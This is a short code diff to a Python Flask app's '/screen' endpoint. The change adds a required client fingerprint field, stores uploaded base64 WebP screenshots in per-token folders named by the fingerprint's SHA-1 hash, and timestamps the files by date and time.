@@ -1,4 +1,6 @@
 from pathlib import Path
+from datetime import datetime
+import hashlib
 import base64
 import json
 import re
@@ -51,16 +53,23 @@ def internet():
 @app.route('/screen', methods=['POST'])
 def screen():
     data = request.get_json()
-    if any(key not in data for key in ['img', 'mid']):
+    if any(key not in data for key in ['img', 'mid', 'fp']):
         return json_error
     token = data['mid']
     if not check_token_path(token):
         return json_error
 
+    fp = data['fp']
+    m = hashlib.sha1()
+    m.update(json.dumps(fp, sort_keys=True).encode('utf-8'))
+    sha1 = m.hexdigest()[:7]
+    d = DATA_FOLDER / token / sha1
+    d.mkdir(exist_ok=True)
+
     img = data['img']
     img = base64.b64decode(img)
 
-    filename = DATA_FOLDER / token / (str(milli_time()) + ".webp")
+    filename = d / (datetime.now().isoformat(sep=' ', timespec='seconds') + '.webp')
     with filename.open("wb") as f:
         f.write(img)
     return json_ok
